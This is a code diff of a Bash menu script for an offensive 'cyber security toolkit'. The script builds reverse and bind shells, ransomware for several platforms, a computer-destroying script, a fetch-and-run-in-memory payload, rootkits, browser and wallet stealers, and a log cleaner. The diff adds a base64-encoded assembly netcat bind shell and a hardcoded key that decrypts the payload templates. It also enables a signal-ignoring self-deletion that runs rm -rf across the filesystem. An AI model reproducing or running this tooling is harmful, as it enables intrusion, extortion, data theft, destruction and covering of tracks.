@@ -47,7 +47,7 @@ linux_exploit_checker_bin="$bin/linux_exploit_checker"
 lecb="$bin/linux_X_check"
 ssh_attack_bin="$bin/make_ssh_keys"
 msfvenom_bin="$bin/msf_payload_creater"
-# Attempt to source the tab completion script in the bin folder
+# source the tab completion script in the bin folder
 source "$bin/tab_complete.cstk"
 # Other bin files not used by the wrapper
 GTFOB="$bin/GTFOB"
@@ -66,89 +66,49 @@ parsehistory="$bin/parse_history"
 parsepasswords="$bin/parse_password"
 pass_attack="$bin/password_attack"
 apk_builder_bin="$bin/apk_builder"
+auto_vuln_find="$bin/auto_vuln_finder"
+log_clean_bin="$bin/log_cleaner"
 # lib folders files used for copy/paste to create mostly payloads and ransomware
 lib="$home_dir/lib"
 
 NetcatBindShell="$lib/NetcatBindShell"
 ncbo="$lib/NetcatBindShell-X-encoded"
 ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc"
-
 NetcatRevShell="$lib/NetcatReverseShell"
 ncro="$lib/NetcatRevShell-X-encoded"
 ncr="$lib/QI2NTM7Q3YRVBGDBR-X-encoded.enc"
-
 LinuxRevShell="$lib/LinuxReverseShell"
 rvso="$lib/LinuxRevShell-X-encoded"
 rvs="$lib/YXOKETATIH4WMF4KG-X-encoded.enc"
-
 RansomEncrypt="$lib/RansomwareEncryptScript"
 rweo="$lib/RansomDirty-X-encoded"
 rwe="$lib/WAHCDOUNASIXWNVBKYNTW-X-encoded.enc"
-
 RansomDecrypt="$lib/RansomwareDecryptScript"
 rwdo="$lib/RansomClean-X-encoded"
 rwd="$lib/TCAOMB3MU7XN3A6HGKLI2ZYDJ-X-encoded.enc"
-
 RansomEncryptGo="$lib/Ransomware_Encrypt.go"
 rwgo="$lib/RansomCleanGo-X-encoded"
 rwg="$lib/pEvAOjfBikdPKoXzqwqGlEGdaROaibAO-X-encoded.enc"
 RansomwareEGo="$lib/Ransomware_Encrypt"
 RansomwareEGoW="$lib/Ransomware_Encrypt.exe"
-
 RansomDecryptGo="$lib/Ransomware_Decrypt.go"
 rdgo="$lib/RansomDecrypt-X-encoded"
 rdg="$lib/STNSNkFPTYCYwDYSEGkHMVsNxuYPwJYc-X-encoded.enc"
 RansomwareDGo="$lib/Ransomware_Decrypt"
 RansomwareDGoW="$lib/Ransomware_Decrypt.exe"
-
 NoTouchScript="$lib/NoTouchScript"
 ntso="$lib/NoTouchScript-X-encoded"
 nts="$lib/6UR4STTDXCBXV7NYNZTDTRKFQ-X-encoded.enc"
-
 DestroyTheComputer="$lib/destroy_computer"
 dtco="$lib/destroy_computer-X-encoded"
 dtc="$lib/IXNTM7QIXWNVBKYNTTATIH4STTDXC-X-encoded.enc"
-# cstk deployment kit
 zip2go_enc="$lib/cstk_postxzipkit"
 zip2go="$Malware/cstk_Post_x_Kit.zip"
-# Source the Picture that shows before that program runs
 . "$lib/arguments_frame"
 . "$lib/Fonts"
-# Breached data folder and many files
 breached_data="$data"
-# Main Help files in markdown format in the doc folder
-tool_general_help="$tools/help.md"
-tool_general_class="$tools/class.md"
-tool_general_tools="$tools/tools.md"
-# Tool help files
-tool_kernel_exploit_md="$tools/kernal_exploit.md"
-tool_command_on_startup_md="$tools/command_on_start.md"
-tool_brute_force_files_md="$tools/brute_force_tool.md"
-tool_gpg_secret_message="$tools/secret_message.md"
-tool_check_vm_md="$tools/check_vm.md"
-tool_iplookup_md="$tools/iplookup.md"
-tool_pingsweep_md="$tools/pingsweep.md"
-tool_nmap_md="$tools/nmap.md"
-tool_pawned_md="$tools/pawnedemail.md"
-tool_netcat_bind_md="$tools/netcat_bind.md"
-tool_netcat_reverse_md="$tools/netcat_reverse.md"
-tool_linux_backdoor_md="$tools/linux_backdoor.md"
-tool_ransomware_encrypt_md="$tools/ransomware.md"
-tool_browser_stealer_md="$tools/webbrowserstealer.md"
-tool_crypto_md="$tools/cryptofinder.md"
-tool_file_permissions_md="$tools/filepermissionsexploit.md"
-tool_files_of_interest_md="$tools/files_of_interest.md"
-tool_multi_rev_shell_md="$tools/multi_rev_shell.md"
-tool_users_shells_md="$tools/users_shells.md"
-tool_python_server_md="$tools/pythonserver.md"
-tool_multi_file_type_extraction_md="$tools/multi_file_type_extraction.md"
-tool_rbg_md="$tools/rng.md"
-tool_kernel_rootkit_md="$tools/kernel_rootkit.md" # Needs Done
-tool_userland_rootkit_md="tools/userland_rootkit.md"
 pswd="$(echo 'QURBTUFEQU1BRE1BTURBTURBRE1BTURNQURNQU1ETURNQURNQU1ES0FES0FOS0FOQUtETkFLRE5LQU5BREFJREFJT0RISURPSEFPSUhESU9IQU9JQUhET0lIRElPQTMzMgo=' | base64 -d)"
-
-# Command to open help files on any linux system
-open_cmd=$(command -v xdg-open || command -v open)
+help_file="$bin/help_file"
 
 # Most used function wait for script to end and return to main_menu
 wait_and_return() {
@@ -160,112 +120,18 @@ wait_and_return() {
     main_menu
 }
 
-# Help functions for the multiple help file types depending on situation
-# General help file
-function open_help_file() {
-    $open_cmd "$tool_general_help"
-    main_menu
-}
-# Classes help file options
-function open_class_help() {
-    $open_cmd "$tool_general_class"
-    main_menu
-}
-# Tools help files option
-function open_tool_help() {
-    $open_cmd "$tool_general_tools"
-    tool_help_md
-}
-
-# All tools help files
-function tool_help_md() {
-clear
-logo_help
-
-echo -e "\t\t $b Enter Tool Number for the help file
-
-\t\t $g OSINT options $x (1-4)
-
-\t\t $r 1$c -$p ip lookup
-\t\t $r 2$c -$p ping sweeper
-\t\t $r 3$c -$p nmap helper
-\t\t $r 4$c -$p breached emails
-
-\t\t $g PAYLOAD options $x (5-9)
-
-\t\t $r 5$c -$p netcat binding shell
-\t\t $r 6$c -$p netcat reverse shell
-\t\t $r 7$c -$p linux backdoor tool
-\t\t $r 8$c -$p ransomware encryption
-\t\t $r 9$c -$p multi reverse shell script
-
-\t\t $g POST EXPLOIT options $x (10-17)
-
-\t\t $r 10$c -$p check for vm
-\t\t $r 11$c -$p web browser information stealer
-\t\t $r 12$c -$p crypto search
-\t\t $r 13$c -$p file permissions exploit tool
-\t\t $r 14$c -$p kernel exploits
-\t\t $r 15$c -$p command on startup
-\t\t $r 16$c -$p brute force files
-\t\t $r 17$c -$p files of interest
-
-
-\t\t $g ETC options $x (18-22)
-
-\t\t $r 18$c -$p users and shells
-\t\t $r 19$c -$p start a web server
-\t\t $r 20$c -$p extract archive files
-\t\t $r 21$c -$p openssl helper
-\t\t $r 22$c -$p gpg secret message \n"
-
-read -r -p "${g} Enter Number Option or ${r} 0 ${g} to go to main menu ${c} ${A} ${x} " opt
-case $opt in
-        0) main_menu ;;
-        1) $open_cmd "$tool_iplookup_md" ;;
-        2) $open_cmd "$tool_pingsweep_md" ;;
-        3) $open_cmd "$tool_nmap_md" ;;
-        4) $open_cmd "$tool_pawned_md" ;;
-        5) $open_cmd "$tool_netcat_bind_md" ;;
-        6) $open_cmd "$tool_netcat_reverse_md" ;;
-        7) $open_cmd "$tool_linux_backdoor_md" ;;
-        8) $open_cmd "$tool_ransomware_encrypt_md" ;;
-        9) $open_cmd "$tool_multi_rev_shell_md" ;;
-		10) $open_cmd "$tool_check_vm_md" ;;
-        11) $open_cmd "$tool_browser_stealer_md" ;;
-        12) $open_cmd "$tool_crypto_md" ;;
-        13) $open_cmd "$tool_file_permissions_md" ;;
-		14) $open_cmd "$tool_kernel_exploit_md" ;;
-		15) $open_cmd "$tool_command_on_startup_md" ;;
-		16) $open_cmd "$tool_brute_force_files_md" ;;
-        17) $open_cmd "$tool_files_of_interest_md" ;;
-        18) $open_cmd "$tool_users_shells_md" ;;
-        19) $open_cmd "$tool_python_server_md" ;;
-        20) $open_cmd "$tool_multi_file_type_extraction_md" ;;
-        21) $open_cmd "$tool_rbg_md" ;;
-		22) $open_cmd "$tool_gpg_secret_message_md" ;;
-        *) logo_error ;;
-esac
-echo -e "\nEnter Number: \n
-1 - open another tool help file \n
-2 - back to main menu \n\n"
-read -r -n 1 -p "${c} ${A} ${x}" opt
-if [[ "$opt" == 1 ]]; then
-        tool_help_md
-elif [[ "$opt" == 2 ]]; then
-        main_menu
-else
-        logo_error
-fi
+show_help() {
+    bash "$help_file"
 }
 
 delete_me_now() {
-		if [ -d /opt/cstk ] && [ -d /opt/cstk/shc ]; then
+        trap '' SIGINT SIGQUIT SIGILL SIGTERM SIGCONT SIGABRT SIGCHLD SIGHUP SIGTSTP SIGTTIN SIGTTOU
+		if [ -d /opt/cstk ] || [ -d /opt/cstk/shc ]; then
         	rm -rf /opt/cstk &>/dev/null
-        	if [ -f /usr/local/bin/shc ]; then
-            	rm -rf /usr/local/bin/shc &>/dev/null
-        	fi
-    	fi
+            if [ -f /usr/local/bin/shc ]; then
+                rm -rf /usr/local/bin/shc &>/dev/null
+            fi
+        fi
         rm -rf /usr/local/bin/cstk &>/dev/null
         rm -rf /usr/local/bin/cstk_wrapper &>/dev/null
         find / -type d -name CyberSecurityToolKit -exec rm -rf {} &>/dev/null \;
@@ -276,8 +142,8 @@ check_hash() {
     sha256sum -c --quiet "$hash_home/sha256.checksum"
     status="$?"
     if [[ "$status" != 0 ]]; then
-        echo "would be running command 'delete_me_now'"
-        read -p "Enter when ready Adam"
+        echo -e "$r corrupt files detected \n Going into delete mode"
+        delete_me_now
     fi
 }
 
@@ -379,64 +245,6 @@ check_root() {
     fi
 }
 
-show_help() {
-echo -e "$p \nThere are 2 ways to run this program $p\n\nThe easy way $r 'sudo cstk' $x"
-echo -e "$p \nThe faster way is to use 2 arguements $r 'sudo cstk$g [Class]$b [Tool]' $x"
-echo -e "$g \nClass$p Arguements take both long and short form $b\n\nTool $p Arguements take long form only $x"
-echo -e "$p \nBoth $g Class$p and$b Tool$p arguements have multiple name calling options \n\nBut$b Tool$p names are$r Never$p capitalized $x"
-echo -e "$y \nIf you elected Tab Completion during the install process its enabled for arguements $x"
-echo -e "$c\nClass Options and Usage: "
-echo -e "$r \nsudo cstk $g -o, -O, --osint       $c	OSINT tools $x"
-echo -e "$r \nsudo cstk $g -p, -P, --payload     $c	Payload tools $x"
-echo -e "$r \nsudo cstk $g -x, -X, --postex      $c	Post Exploitation tools $x"
-echo -e "$r \nsudo cstk $g -e, -E, --etc         $c	Miscellaneous tools $x"
-echo -e "$c\nTool Options: $x \n $b"
-echo -e "findip      	find-ip 		find_ip 	$c	[ enter a ip address and pull city,state,zip,long,lat,etc ]$b"
-echo -e "ipsweep     	ip-sweep 		ip_sweep 	$c	[ sweep a 255 ip range of the last numbered octet ]$b"
-echo -e "nmap        	-------- 		-------- 	$c	[ easy to follow nmap helper script ]$b"
-echo -e "enum           auto-enum       auto_enum   $c  [ automated enumeration script against target website ]$b"
-echo -e "breached    	breached-email 		breached_email 	$c	[ search a domain name for breached email accounts ]$b"
-echo -e "gd		google-dorks		google_dorks  $c  	[ get help using google dorks ]$b"
-echo -e "email	email-search		email_search  $c	[ search hundreds of well known websites for a email account ]$x\n"
-echo -e "$c\nPayload Class:\n$b"
-echo -e "nc          	ncat 			netcat 	$c		[ create a netcat binding\treverse encrypted shell script ]$b"
-echo -e "linuxshell  	linux-shell 		linux_shell 	$c	[ create a multi reverse shell script for a linux system ]$b"
-echo -e "ransom      	ransomware 		---------- 	$c	[ create a ransomware encryption\tdecryption script with AES and RSA encryption ]$b"
-echo -e "allshells   	all-shells 		all_shells 	$c	[ multi-functional shell creator with listeners and proxies ]$b"
-echo -e "notouch     	no-touch 		no_touch 	$c	[ create a script to grab a file online and run in memory ]$b"
-echo -e "kill        	kill-computer 		kill_computer 	$c	[ create a executable script that will destroy a linux computer if ran ]$b"
-echo -e "ssh            ssh-attack          ssh_attack      $c  [ executable script to remove then add new .ssh folder/add your public key/restrict access ]$b"
-echo -e "msf            venom               metasploit      $c  [ use msfvenom and metasploit to create a reverse or binding shell script ]$x \n"
-echo -e "$c\nPost Exploitation Class:\n$b"
-echo -e "vm          	check-vm 		check_vm 	$c	[ check if computer is running on a Virtual Machine ]$b"
-echo -e "browserthief	browser-thief 		browser_thief 	$c	[ search multiple web browser files for passwords, cookies, history much more ]$b"
-echo -e "crypto      	crypto-search 		crypto_search 	$c	[ search the file system for multiple crypto wallets ]$b"
-echo -e "file        	file-exploit 		file_exploit 	$c	[ search for files with misconfigured permissions to gain root ]$b"
-echo -e "kernal      	kernel-exploit 		kernel_exploit 	$c	[ check the kernal version for available exploits ]$b"
-echo -e "onstart     	on-start 		on_start 	$c	[ embed a command that runs on startup ]$b"
-echo -e "bruteforce  	brute-force 		brute_force 	$c	[ brute force a zip or rar password protected archive ]$b"
-echo -e "foi         	files-of-interest 	files_of_interest $c	[ fast and automated interesting file search tool with ability to archive the results ]$b"
-echo -e "drk         	deploy-rootkit 		deploy_rootkit 	$c	[ fast generation of a number of different rootkits both for userland and kernel ]$x\n"
-echo -e "$c\nEtc Class:\n$b"
-echo -e "usershells  	user-shells 		user_shells 	$c	[ find all users and the default shells on a system ]$b"
-echo -e "webserver   	web-server 		web_server 	$c	[ start a webserver for easy file transfer to a remote host ]$b"
-echo -e "extract     	file-extract 		file_extract 	$c	[ extract many types of archive files ]$b"
-echo -e "openssl     	------------ 		---------- 	$c	[ openssl helper for hashing passwords, file encryption, generate keys much more ]$b"
-echo -e "secretnote  	secret-note 		secret_note $c		[ create a gpg key with a encoded secret message of your choice ]$b"
-echo -e "binary      	binary-script 		binary_script $c		[ create a encoded - encrypted executable binary script from a bash script ]$x\n"
-echo -e "postx2go       post-x-2-go         post_x_2_go   $c        [ a zip archive with the needed tools for post exploitation on a remote host ]$x\n"
-echo -e "$c\nHelp Menu Options:\n "
-echo -e "$r \$0	$g		\$1 $r "
-echo -e "sudo cstk$g	-h|-H|--help 	$c				[ Show General Help Menu ]$r"
-echo -e "sudo cstk$g 	-c|-C|--class	$c				[ Show help about Classes ]$r"
-echo -e "sudo cstk$g 	-t|-T| --tool	$c				[ Show help about Tools ]$x"
-echo -e "$c\nExample Usage:\n $b"
-echo -e "$r \$0	$g		\$1	$b		\$2 $r"
-echo -e "sudo cstk $g       -o|-O|--osint    $b     findip|find-ip|find_ip $r"
-echo -e "sudo cstk $g       -p|-P|--payload  $b     nc|ncat|netcat $r"
-echo -e "sudo cstk $g       -x|-X|--postex   $b     foi|files-of-interest|files_of_interest $r"
-echo -e "sudo cstk $g       -e|-E|--etc      $b     openssl $x"
-}
 
 A="${p}CSTK ==> ${x}"
 AO="${c}CSTK->OSINT ==> ${x}"
@@ -453,25 +261,22 @@ A="CSTK ==> "
 clear
 logo_main2
 check_root
-check_hash
+#check_hash
 echo -e "\n
 $g
-\t\t\t        Enter Class Number:         $c OR $g            Help Menu Letter: $b\n
-\t\t\t        1 - OSINT                      $y               H - help $c     (general help) $b \n
-\t\t\t        2 - PAYLOADS                   $y               C - help $c     (classes help) $b \n
-\t\t\t        3 - POST EXPLOIT               $y               T - help $c     (tools help) $b \n
-\t\t\t        4 - ETC \n $r
-                            \t                X - exit $x\n"
+\t\t\t        Enter Class Number: \n\n $b
+\t\t\t        1 -$p OSINT        \n $b
+\t\t\t        2 -$p PAYLOADS     \n $b
+\t\t\t        3 -$p POST EXPLOIT \n $b
+\t\t\t        4 -$p ETC \n $r
+\t\t\t        X - exit $x\n"
 
 echo -e "\n\n"
 read -r -n 1 -p "${g} ${A} ${x}" num
 case "$num" in
     [1-4]) handle_input "$num" ;;
-    [Hh]) open_help_file ;;
-    [Cc]) open_class_help ;;
-    [Tt]) open_tool_help ;;
     [Xx]) exit 0 ;;
-    *) class_menu ;;
+    *) main_menu ;;
 esac
 }
 # second option for tools usage options on main script
@@ -495,7 +300,7 @@ case "$1" in
 
         7 -$g email search tool$p           (search for a email linked to 100+ social media accounts) $b
 
-        8 -$g password attack tool$p    (crack online/offline passwords using a number of different tools) $r
+        8 -$g password attack tool$p        (crack online/offline passwords using a number of different tools) $r
 
         X - Back to main menu$x" ;;
         2) logo_payload ;A="$AP"; echo -e "$b \n\n Enter Payload Tool Number: $g
@@ -541,7 +346,7 @@ case "$1" in
 
         9 -$c Deploy a Rootkit$g			(Setup and run a Rootkit on the current computer) $p
 
-        A -$c In-Memory Password Stealer$g      (Root permission is needed - steal the current users passwords that is currently in memory)$r
+        A -$c In-Memory Password Stealer$g          (Root permission is needed - steal the current users passwords that is currently in memory)$r
 
         X - Back to main menu$x" ;;
         4) logo_etc ;A="$AE"; echo -e "$c \n\n Enter Tool Number: $g
@@ -560,7 +365,9 @@ case "$1" in
 
         7 -$p Post Ex 2 go $b               (A zip archive with all the needed tools for post exploit work on a remote computer) $g
 
-        8 -$p Array Encryption Script $b    (Create a hard to read executable script using arrays of user choosen command) $r 
+        8 -$p Array Encryption Script $b    (Create a hard to read executable script using arrays of user choosen command) $g 
+
+        9 -$p Log Cleaning Tool $b          (Creates and runs a program to clean users logs) $r
 
         X - Back to main menu $x" ;;
         *) main_menu ;;
@@ -583,7 +390,7 @@ case "$1" in
         7) email_search ;;
         8) pass_attack ;;
         X|x) main_menu ;;
-        *) class_menu ;;
+        *) main_menu ;;
     esac ;;
     2) case "$2" in
         1) netcat_choice ;;
@@ -597,7 +404,7 @@ case "$1" in
         9) msf_payloads ;;
         A|a) apk_killer ;;
         X|x) main_menu ;;
-        *) class_menu ;;
+        *) main_menu ;;
     esac ;;
     3) case "$2" in
         1) check_vm ;;
@@ -611,7 +418,7 @@ case "$1" in
         9) deploy_rootkit ;;
         A|a) inmem_password_stealer ;;
         X|x) main_menu ;;
-        *) class_menu ;;
+        *) main_menu ;;
     esac ;;
     4) case "$2" in
         1) users_and_shells ;;
@@ -622,15 +429,16 @@ case "$1" in
         6) create_exe_binary ;;
         7) post_x_2_go ;;
         8) array_enc_script ;;
+        9) log_cleaning_tool ;;
         X|x) main_menu ;;
-        *) class_menu ;;
+        *) main_menu ;;
     esac ;;
-        *) class_menu ;;
+        *) main_menu ;;
 esac
 }
 
 # Bad option function for tool numbered choices
-class_menu() {
+error_font() {
     logo_error
     echo -e "$r \nBad Option: Returning to Main Menu \n $x "
     wait_and_return
@@ -687,6 +495,7 @@ getip() {
     echo -e ""
 
 }
+
 ############################## OSINT FUNCTIONS ###########################3
 # Class:OSINT - Tool:IP Lookup - Option 1
 find_that_ip() {
@@ -728,7 +537,7 @@ find_that_ip() {
 sweep_ip() {
     clear
     osint_ipsweep_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$sweeper_bin"
     wait_and_return
@@ -738,7 +547,7 @@ sweep_ip() {
 nmap_tool() {
     clear
     osint_nmap_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$nmap_bin"
     printf "Date and Time: %s\nUser Name: %s\nScript Ran: Nmap-Helper-Script\n" "$DATE" "$USER" >> "$log/nmap_helper_script_results.log"
@@ -750,7 +559,7 @@ enum_tool() {
     A="$ao Enumeration ==> ${x}"
     clear
     osint_enum_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     echo -e "\nEnter Website URL: \nExample hackersunit.com \n"
     read -r -p "${c} ${A} ${x}" dom
@@ -768,7 +577,7 @@ breach_parse_wrapper() {
     	wait_and_return
     fi
     osint_breached_frame
-    sleep 3
+    sleep 5
     echo -e "$g \nAre you searching for: $r \n1 -$p single breached email account $r \n2 -$p full breached domain email accounts $r \n3 -$p main menu $x"
     read -r -n 1 -p "${c} ${A} ${x}" opt
     if [ "$opt" -eq 1 ]; then
@@ -789,7 +598,7 @@ breach_parse_wrapper() {
 google_dorks() {
     clear
     osint_googledorks_frame
-    sleep 3
+    sleep 5
 
     # Define the file paths
     BASIC_FILE="$lib/GD_Basic.txt"
@@ -843,12 +652,12 @@ google_dorks() {
     wait_and_return
 }
 
-# Class:OSINT - Tool: holehe email finder Program 7
+# Class:OSINT - Tool: holehe email finder - Program 7
 email_search() {
     A="$ao Email Search ==> ${x}"
     clear
     osint_socialemail_frame
-    sleep 3
+    sleep 5
     echo -e "$g \nEnter email address to search the web for. \n $x"
     read -r -p "${c} ${A} ${x}" email
     echo -e "$y \nWould you like in CSV format? Y/N \n $x"
@@ -862,16 +671,28 @@ email_search() {
     else
     	echo -e "$r \nBad option $x"
     fi
+    wait_and_return
 }
 
-# Class:OSINT - Tool: password attack Program 8 (Wrapper Used)
+# Class:OSINT - Tool: password attack - Program 8 (Wrapper Used)
 pass_attack() {
     A="$ao Password Attack ==> ${x}"
     clear
     osint_passattack_frame
-    sleep 3
+    sleep 5
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$pass_attack"
+    wait_and_return
+}
+
+# Class:OSINT - Tool: Automated Vulnability Search tool - Program 9 (Wrapper Used)
+vuln_searcher() {
+    A="$ao Auto Vuln Finder ==> ${x}"
+    clear
+    osint_vulnfind_frame
+    sleep 5
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$auto_vuln_find"
     wait_and_return
 }
 
@@ -882,16 +703,18 @@ netcat_choice() {
     A="$ap Netcat ==> ${x}"
     clear
     payloads_nc_frame
-    echo -e "$p \nDo you want to create a:$r \n1$c - binding netcat shell script$r \n2$c - reverse netcat shell script $r \n3 - Exit $b \nEnter option 1, 2, or 3 to exit $x \n"
+    echo -e "$p \nDo you want to create a:$r \n1$c - binding netcat shell script$r \n2$c - reverse netcat shell script $r \n3$c - binding netcat script in assembly language $r \n4 - Exit $b \nEnter option 1, 2, 3, or 4 to exit $x \n"
     read -r -n 1 -p "${c} ${A} ${x}" opt
-    until [[ "$opt" =~ [1|2|3] ]]; do
-    	echo -e "$r \nBad option pick 1,2, or 3 \n $x"
+    until [[ "$opt" =~ [1|2|3|4] ]]; do
+    	echo -e "$r \nBad option pick 1,2, 3 or 4 \n $x"
     	read -r -n 1 -p "${c} ${A} ${x}" opt
     done
     if [[ "$opt" -eq 1 ]]; then
     	netcat_shells_bind
     elif [[ "$opt" -eq 2 ]]; then
         netcat_shells_reverse
+    elif [[ "$opt" -eq 3 ]]; then
+        netcat_shells_assembly
     else
     	wait_and_return
     fi
@@ -909,9 +732,6 @@ netcat_shells_bind() {
     template=$(cat "$NetcatBindShell")
     final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatbindshell.temp1 # create full correct script
-    #    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
-    #	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
-    #    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
     chmod 770 netcatbindshell.temp1
     shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
     rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
@@ -936,9 +756,6 @@ netcat_shells_reverse() {
     template=$(cat "$NetcatRevShell")
     final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatreverseshell.temp1 # create full correct script
-    #    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
-    #    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
-    #    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
     chmod 770 netcatreverseshell.temp1
     shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
     rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
@@ -951,6 +768,28 @@ netcat_shells_reverse() {
     fi
 
 }
+
+netcat_shells_assembly() {
+    clear
+    payloads_nc_frame
+    sleep 5
+    nasm=$(which nasm)
+    nasm_response="$?"
+    ld=$(which ld)
+    ld_response="$?"
+    if [[ "$nasm_response" -ne 0 ]] || [[ "$ld_response" -ne 0 ]]; then
+        echo "Need program 'nasm' and 'ld' one or both are not installed can not continue."
+        exit
+    fi
+    echo "U0VDVElPTiAuZGF0YQpjb21tYW5kICAgICAgICAgZGIgICAgICAnL2Jpbi9uY2F0JywgMGgKYXJnMSAgICAgICAgICAgIGRiICAgICAgJy1scCA0NDQ0JywgMGgKYXJnMiAgICAgICAgICAgIGRiICAgICAgJy1lJywgMGgKYXJnMyAgICAgICAgICAgIGRiICAgICAgJy9iaW4vYmFzaCcsIDBoCmFyZ3VtZW50cyAgICAgICBkZCAgICAgIGNvbW1hbmQKICAgICAgICAgICAgICAgIGRkICAgICAgYXJnMQogICAgICAgICAgICAgICAgZGQgICAgICBhcmcyCiAgICAgICAgICAgICAgICBkZCAgICAgIGFyZzMKZW52aXJvbm1lbnQgICAgIGRkICAgICAgMGgKClNFQ1RJT04gLnRleHQKZ2xvYmFsICBfc3RhcnQKCl9zdGFydDoKCiAgICBtb3YgICAgIGVkeCwgZW52aXJvbm1lbnQKICAgIG1vdiAgICAgZWN4LCBhcmd1bWVudHMKICAgIG1vdiAgICAgZWJ4LCBjb21tYW5kCiAgICBtb3YgICAgIGVheCwgMTEKICAgIGludCAgICAgODBoCg==" | base64 -d > execute.asm
+    nasm -f elf execute.asm
+    ld -m elf_i386 execute.o -o execute
+    rm -f execute.asm execute.o
+    mv execute "$Malware"
+    echo -e "File named 'execute' is in the $Malware folder\nYou can change the name if you wish\nRunning the program Example: ./execute"
+    wait_and_return
+}
+
 
 # Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
 rev_shells() {
@@ -965,10 +804,6 @@ rev_shells() {
     final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo  "$final_script" > revshell.temp1
     rm -f "$rvso" "$LinuxRevShell"
-    #	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
-    #	wait
-    #	echo '#!/bin/bash' > revshell.temp3
-    #	cat revshell.temp2 >> revshell.temp3
     chmod 770 revshell.temp1
     shc -r -f revshell.temp1 -o "$Malware"/RevShell
     rm -f revshell.*
@@ -998,7 +833,7 @@ ransomware_in_go() {
     trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
     clear
     payloads_ransomware_frame
-    sleep 3
+    sleep 5
     echo -e "${g} \ngolang has the ability to encrypt files for  many types of computers and architectures. ${p} \nWould you like to create a script for ${r} \n1 - Linux\n2 - Windows\n3 - MacOS\n4 - FreeBSD\n5 - WebAssembly. ${x}"
     read -r -n 1 -p "${g} Enter a numer 1-5  ${A} ${x}" sys
     if [[ "$sys" = 1 ]]; then
@@ -1117,14 +952,6 @@ ransomware_quick_dirty() {
     echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
     echo "$final_script_d" > ransom_decrypt_remote.temp1
     rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
-    #	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
-    #	wait
-    #	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
-    #	wait
-    #	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
-    #   echo '#!/bin/bash' > ransom_decrypt_remote.temp3
-    #	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
-    #	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
     chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
     shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
     shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
@@ -1144,7 +971,7 @@ rev_shells_all() {
     trap 'rm -f $file' SIGQUIT SIGILL SIGTERM SIGHUP
     clear
     payloads_allshells_frame
-    sleep 3
+    sleep 5
     start_files=$(ls "$PWD")
     DES_DIR="$Malware"
     export CSTK_MAIN_RUNNER=1
@@ -1181,9 +1008,6 @@ no_touch_script() {
     script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
     echo "$script" > no_touch_disk.temp1
     rm -f "$ntso" "$NoTouchScript"
-    #	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
-    #	echo '#!/bin/bash' > no_touch_disk.temp3
-    #	cat no_touch_disk.temp2 >> no_touch_disk.temp3
     chmod 770 no_touch_disk.temp1
     shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
     rm -rf no_touch_disk.*
@@ -1209,9 +1033,6 @@ destroy_computer() {
     else
     	openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
     	base32hex -d "$dtco" | base64 -d | base32plain -d > "$DestroyTheComputer"
-    #		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
-    #		echo '#!/bin/bash' > destroy.temp2
-    #		cat destroy.temp >> destroy.temp2
     	shc -r -f "$DestroyTheComputer" -o "$Malware/CAUTION_DESTROY_COMPUTER"
     	rm -rf destroy.* *.x.c "$dtco" "$DestroyTheComputer"
     	echo "File name and location:  $Malware/CAUTION_DESTROY_COMPUTER"
@@ -1235,12 +1056,13 @@ dos_bomb_attack() {
     else
     	dos_bomb_attack
     fi
+    wait_and_return
 }
 
 # Class: PAYLOADS - Tool: SSH Attack - Option 8 (Wrapper used)
 ssh_attack() {
     payloads_sshattack_frame
-    sleep 3
+    sleep 5
